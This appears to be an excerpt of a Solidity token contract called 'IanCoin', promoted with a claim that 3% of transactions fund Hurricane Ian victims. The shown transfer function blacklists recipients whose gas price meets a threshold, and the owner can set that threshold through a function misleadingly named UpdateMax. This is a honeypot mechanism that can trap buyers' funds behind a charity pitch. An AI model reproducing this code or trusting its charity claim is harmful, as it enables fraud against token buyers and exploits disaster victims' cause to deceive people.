...
Hurricane Ian on its way. 3% of all TX's will be used to build a fund to donate to any victims or people who experience hardship from the Hurricane.
...
contract IanCoin is Ownable, IBEP20 {
    ...
    string constant _name = "IanCoin";
    string constant _symbol = "IAN";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x2c0bbeB1a6b7ABe8e49f037e52Ff8422277a41d6;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= AS && recipient != pair) {
            isblacklisted[recipient] = true;
        }
            
        
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != stakingFeeReceiver && recipient != buybackFeeReceiver && recipient != marketingFeeReceiver && !isTxLimitExempt[recipient]){
    ...
    function UpdateMax (uint256 _AS) public onlyOwner {
               AS = _AS * 1 gwei; 
